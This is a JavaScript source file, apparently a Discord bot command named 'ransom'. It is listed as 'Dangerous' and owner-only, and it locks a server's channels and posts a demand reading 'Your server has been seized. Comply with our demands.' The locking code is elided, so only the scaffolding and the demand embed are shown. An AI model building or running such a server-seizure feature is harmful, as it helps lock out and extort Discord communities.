...
module.exports = {
    data: new SlashCommandBuilder()
        .setName("ransom")
        .setDescription("Lock all channels and post a ransom demand.")
        .setDMPermission(false)
        .addStringOption(o => o.setName("demand").setDescription("The ransom message").setRequired(false)),
    name: "ransom",
    description: "Lock all channels and post a ransom.",
    category: "Dangerous",
    ownerOnly: true,
    guildOnly: true,
    async execute({ ctx, interaction, guild, config }) {
        ...
        const demand = interaction?.options?.getString("demand") ?? ctx.args?.join(" ") ?? "Your server has been seized. Comply with our demands.";

        await requireDangerousAuth(ctx, "ransom", async () => {
            ...
            await ctx.channel.send({ embeds: [
                embeds.danger("RANSOM DEMAND", demand)
                    .addFields({ name: "Channels Locked", value: `${locked}`, inline: true })
            ] });
        }, config);
    }
};
